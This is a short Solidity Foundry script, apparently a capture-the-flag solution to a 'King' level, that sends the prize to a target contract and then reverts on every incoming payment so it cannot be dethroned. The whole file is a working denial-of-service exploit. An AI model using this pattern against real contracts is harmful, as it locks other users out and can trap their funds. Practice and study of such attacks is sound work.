// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";


contract KingAttacker is Constants, Script {
    uint256 private constant STARTING_PRIZE = 1000000000000000;  // 1e15

    function run() public {
        vm.startBroadcast(ATTACKER_ADDRESS);
        attack();
        vm.stopBroadcast();
    }
    
    function attack() private {
        KING_ADDRESS.call{value: STARTING_PRIZE}("");
    }
    
    receive() external payable {
        revert("I am THE KING!");
    }
}